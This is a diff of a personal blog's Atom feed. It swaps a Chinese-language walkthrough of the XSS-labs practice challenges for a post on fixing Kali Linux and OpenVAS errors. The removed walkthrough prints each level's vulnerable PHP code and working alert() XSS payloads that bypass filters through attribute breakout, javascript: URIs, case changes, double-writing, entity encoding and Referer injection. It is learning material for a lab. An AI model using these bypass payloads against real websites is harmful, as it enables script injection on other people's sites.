@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://kite-007.github.io</id>
     <title>Fr</title>
-    <updated>2021-03-23T13:41:59.368Z</updated>
+    <updated>2021-04-04T14:37:11.084Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://kite-007.github.io"/>
     <link rel="self" href="https://kite-007.github.io/atom.xml"/>
@@ -11,2148 +11,1649 @@
     <icon>https://kite-007.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Fr</rights>
     <entry>
-        <title type="html"><![CDATA[# XSS-labs]]></title>
-        <id>https://kite-007.github.io/xss-ba-chang/</id>
-        <link href="https://kite-007.github.io/xss-ba-chang/">
+        <title type="html"><![CDATA[# KALL 问题解决]]></title>
+        <id>https://kite-007.github.io/kall-wen-ti-jie-jue/</id>
+        <link href="https://kite-007.github.io/kall-wen-ti-jie-jue/">
         </link>
-        <updated>2021-03-22T08:05:28.000Z</updated>
+        <updated>2021-04-04T11:22:19.000Z</updated>
         <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-xss-level1">1. xss-level1</a></li>
-<li><a href="#2-xss-level2">2. xss-level2</a></li>
-<li><a href="#3-xss-level3">3. xss-level3</a></li>
-<li><a href="#4-xss-level4">4. xss-level4</a></li>
-<li><a href="#5-xss-level5">5. xss-level5</a></li>
-<li><a href="#6-xss-level6">6. xss-level6</a></li>
-<li><a href="#7-xss-level7">7. xss-level7</a></li>
-<li><a href="#8-xss-level8">8. xss-level8</a></li>
-<li><a href="#9-xss-level9">9. xss-level9</a></li>
-<li><a href="#10-xss-level10">10. xss-level10</a></li>
-<li><a href="#11-xss-level11">11. xss-level11</a></li>
-<li><a href="#12-xss-level12">12. xss-level12</a></li>
-<li><a href="#13-xss-level13">13. xss-level13</a></li>
-<li><a href="#14-xss-level14">14. xss-level14</a></li>
-<li><a href="#15-xss-level15">15. xss-level15</a></li>
-<li><a href="#16-xss-level16">16. xss-level16</a></li>
-<li><a href="#17-xss-level17">17. xss-level17</a></li>
-<li><a href="#18-xss-level18">18. xss-level18</a></li>
-<li><a href="#19-xss-level19">19. xss-level19</a></li>
-<li><a href="#20-xss-level20">20. xss-level20</a></li>
-</ul>
-(XSS)</p>
-<h1 id="1-xss-level1">1. xss-level1</h1>
-<ol>
-<li>查看文件源码；</li>
-</ol>
-<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level2.php?keyword=test&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level1&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;name&quot;];
-echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
-?&gt;
-&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
-&lt;?php 
-echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
-?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<li><a href="#1-%E5%AE%95%E6%9C%BA%E5%AF%BC%E8%87%B4i2c_piix4">1. 宕机导致i2c_piix4</a></li>
+<li><a href="#2-%E5%AE%89%E8%A3%85openvas">2. 安装openvas</a>
 <ul>
-<li>首先，在head标签的script中重写了alert方法，它会在弹出提示的同时跳转到下一关。</li>
-<li>之后查看到它是以GET方式提交用户名，并没有对这个字符串进行过滤，所以存在xss注入。</li>
-</ul>
-<ol>
-<li>在HackBar中，显示URL:XSS/level1.php?name=test里更改test，直接执行alert方法，完成。</li>
-</ol>
-<pre><code>level1.php?name=&lt;script&gt;alert()&lt;/script&gt;
-</code></pre>
-<h1 id="2-xss-level2">2. xss-level2</h1>
-<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level3.php?writing=wait&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level2&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form action=level2.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
-&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
-&lt;?php 
-echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
-?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<ul>
-<li>一样执行跳转，但是这里有.htmlspecialchars($str).对字符串进行了预定义字符转化为实体
-<ul>
-<li>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体，默认不会处理单引号。</li>
-<li>预定义的字符是：</li>
+<li><a href="#1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</a></li>
+<li><a href="#2-root%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98">2. /root/权限问题</a></li>
+<li><a href="#3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</a></li>
+<li><a href="#4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</a></li>
 </ul>
 </li>
 </ul>
-<pre><code>&amp; （和号）成为 &amp;amp;
-&quot; （双引号）成为 &amp;quot;
-' （单引号）成为 '
-&lt; （小于）成为 &amp;lt;
-&gt; （大于）成为 &amp;gt;
+(问题解决)</p>
+<h1 id="1-宕机导致i2c_piix4">1. 宕机导致i2c_piix4</h1>
+<p>报错：</p>
+<pre><code>piix4_smbus 0000:00:07.3: SMBus Host controller not enabled
 </code></pre>
+<br>
+1. 重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3
 <ul>
-<li>如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。<br>
-我们看到在input标签中有我们提交的value的值，并没有进行过滤就进行输出，所以把input标签闭合，从而执行alert。</li>
-</ul>
-<pre><code>level2.php?keyword=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
-</code></pre>
-<h1 id="3-xss-level3">3. xss-level3</h1>
-<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level3&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
-&lt;form action=level3.php method=GET&gt;
-&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;&quot;;
-?&gt;
-&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
-&lt;?php 
-echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
-?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<ul>
-<li>我们看到这里他对value进行了预定义字符转实体的过滤，实际上单引号还是可以闭合（因为默认没有对单引号进行处理），所以用单引号对input里的value进行包裹使其为空字符串，并利用“事件”：onclick或ondblclick等的其他 <a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">HTML事件</a>。</li>
-</ul>
-<pre><code>&lt;input name=keyword  value='' onclick='alert()'&gt;
-level3.php?keyword=' onclick='alert()
-</code></pre>
-<h1 id="4-xss-level4">4. xss-level4</h1>
-<ol>
-<li>ctrl+u查看源码：</li>
-</ol>
-<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level4&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和&amp;quot; ondblclick=&amp;quot;alert()相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form action=level4.php method=GET&gt;
-&lt;input name=keyword  value=&quot;&quot; ondblclick=&quot;alert()&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:21&lt;/h3&gt;&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<ul>
-<li>根据前面的经验，这里的预定义字符又被过滤了，上一关的是使用单引号进行闭合，这里本应该使用双引号进行包裹，但是会发现这里双引号是会被转义的，那么怎么办？</li>
-<li>但是仔细看就会发现，这里h2标签中的双引号被转义了，input标签中并没有，所以用双引号包裹，完成。</li>
+<li><img src="https://kite-007.github.io/post-images/1617535739059.png" alt="" loading="lazy"></li>
 </ul>
 <ol start="2">
-<li>php代码:</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
-$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form action=level4.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
+<li>这时出现错误：类似于图下
 <ul>
-<li>可以看出input标签中str3只是替换掉了尖括号，h2中则进行了预定义字符转义。</li>
-</ul>
-<h1 id="5-xss-level5">5. xss-level5</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form action=level5.php method=GET&gt;
-&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-</code></pre>
-<ul>
-<li>在h2标签中会进行预定义字符转义，value中一些特殊字符中会加上下划线</li>
-<li>过滤掉了script和事件。</li>
-</ul>
-<ol start="2">
-<li>payload,点击something超链接执行js</li>
-</ol>
-<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
-level5.php?keyword=&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;
-</code></pre>
-<p>javascript:是表示在触发默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击时就没有任何反应。<br>
-href：URL    规定链接的目标 URL。</p>
-<pre><code>&lt;a href=&quot;www.baidu.com&quot;&gt;XXX&lt;/a&gt;   这个a标签的话就是指点击XXX后跳转到百度首页
-&lt;a href=&quot;javascript:;&quot;&gt;XXX&lt;/a&gt;  点击XXX后是不会跳转的，一般用于开发时页面还未完成
-</code></pre>
-<ol start="3">
-<li>php代码</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = strtolower($_GET[&quot;keyword&quot;]);
-$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
-$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form action=level5.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>strtolower就是将字母转换为小写并返回值</li>
-</ul>
-<ol start="4">
-<li><a href="https://www.html.cn/qa/javascript/11155.html">javascript伪协议</a>：
-<ul>
-<li>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</li>
-<li>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</li>
-<li>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</li>
-<li>javascript URL还可以含有只执行动作，但不返回值的javascript语句。装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</li>
+<li><img src="https://kite-007.github.io/post-images/1617535894449.png" alt="" loading="lazy"></li>
 </ul>
 </li>
 </ol>
-<h1 id="6-xss-level6">6. xss-level6</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和 &amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form action=level6.php method=GET&gt;
-&lt;input name=keyword  value=&quot; &quot; /&gt; &lt;a hr_ef=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-</code></pre>
-<ul>
-<li>在前面的基础上过滤了href</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
-$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
-$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
-$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
-$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form action=level6.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>发现了与上一关不同的是这里并没有对大小写进行过滤</li>
-</ul>
-<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
-level6.php?keyword=&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;
-</code></pre>
-<h1 id="7-xss-level7">7. xss-level7</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和&amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form action=level7.php method=GET&gt;
-&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a =java:alert()&gt;something&lt;/a&gt;&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-</code></pre>
-<ul>
-<li>过滤了大小写，特殊字符直接删除掉了</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str =strtolower( $_GET[&quot;keyword&quot;]);
-$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
-$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
-$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
-$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
-$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form action=level7.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
-&lt;input type=submit name=submit value=搜索 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>发现对数据进行了一次删除的过滤，所以可以进行双写包裹绕过。</li>
-</ul>
-<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;script&gt;alert()&lt;/script&gt;&quot;&gt;
-&quot;/&gt; &lt;scripscriptt&gt;alert()&lt;/scriscriptpt&gt;
-</code></pre>
-<h1 id="8-xss-level8">8. xss-level8</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
-&lt;center&gt;
-&lt;form action=level8.php method=GET&gt;
-&lt;input name=keyword  value=&quot;on&quot;&gt;
-&lt;input type=submit name=submit value=添加友情链接 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;o_n&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>过滤大小写，特殊字符增加下划线，上面对预字符进行过滤，下面没有过滤尖括号。</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = strtolower($_GET[&quot;keyword&quot;]);
-$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
-$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
-$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
-$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
-$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
-$str7=str_replace('&quot;','&amp;quot',$str6);
-echo '&lt;center&gt;
-&lt;form action=level8.php method=GET&gt;
-&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
-&lt;input type=submit name=submit value=添加友情链接 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-&lt;?php
- echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
-?&gt;
-&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
-&lt;?php 
-echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
-?&gt;
+<pre><code>Failure:File system check of the root filesystem failed
 </code></pre>
 <ol start="3">
-<li>实体化编码，在搜索框中输入</li>
+<li>输入：</li>
 </ol>
-<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
-javascrip&amp;#116;:alert()
-</code></pre>
-<ul>
-<li>因为这里的过滤都是在后端进行，而在后端被实体化编码的部分可以绕过过滤，返回前端时又可以被浏览器解析为原来的样子。</li>
-</ul>
-<h1 id="9-xss-level9">9. xss-level9</h1>
-<ol>
-<li>ctrl+u,提示要有一个合法链接</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
-&lt;center&gt;
-&lt;form action=level9.php method=GET&gt;
-&lt;input name=keyword  value=&quot;javascrip&amp;amp;#116;:alert()&quot;&gt;
-&lt;input type=submit name=submit value=添加友情链接 /&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:23&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php
-if(false===strpos($str7,'http://'))
-{
-  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
-        }
-else
-{
-  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
-}
-?&gt;
-</code></pre>
-<ul>
-<li>这里与level8的区别，加了一个if判断语句，查询链接中是否有http://，如果没有则连接不合法。</li>
-<li>strpos：查询（http://）第一次出现的位置，布尔类型。</li>
-</ul>
-<ol start="3">
-<li>在http://前加了//表示对后面的进行了注释，从而不影响前面的代码。</li>
-</ol>
-<ul>
-<li>这里可以想出http://可以在字符串的任意位置，只要不影响恶意的代码，所以可以写再alert里面尝试。</li>
-</ul>
-<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()//http://&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
-javascrip&amp;#116;:alert()//http://
-javascrip&amp;#116;:alert('http://')
-</code></pre>
-<h1 id="10-xss-level10">10. xss-level10</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>第一个参数keyword的预定义字符被过滤掉了，查看代码后发现还有三个隐藏掉的input，先试一试用GET方式提交参数，发现只有t_sort有显示信息，并且被过滤掉了尖括号。</li>
-<li>从t_sort入手，带有尖括号的标签不能用了，所以尝试使用事件，通过闭合value构造payload。</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str11 = $_GET[&quot;t_sort&quot;];
-$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
-$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ol start="3">
-<li>payload</li>
-</ol>
-<pre><code>level10.php?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()
-</code></pre>
-<h1 id="11-xss-level11">11. xss-level11</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;'&amp;quot;c&amp;quot;'&amp;gt;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_ref&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>t_sort信息有回显，但是预定义字符被过滤掉了。</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str00 = $_GET[&quot;t_sort&quot;];
-$str11=$_SERVER['HTTP_REFERER'];
-$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
-$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>发现这里t_ref是有xss漏洞的，但是提交的方式并不是GET而是SERVER，可以通过HackBar进行Referer提交payload</li>
-</ul>
-<ol start="3">
-<li></li>
-</ol>
-<pre><code>http://192.168.200.1/WWW/XSS/level11.php?t_link=a&amp;t_history=b&amp;t_sort=&lt;&quot;c&quot;&gt;&amp;t_ref=d
-Referer：&quot; type=&quot;text&quot; onclick=&quot;alert()
-</code></pre>
-<h1 id="12-xss-level12">12. xss-level12</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;&amp;quot;c&amp;quot;&amp;gt;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
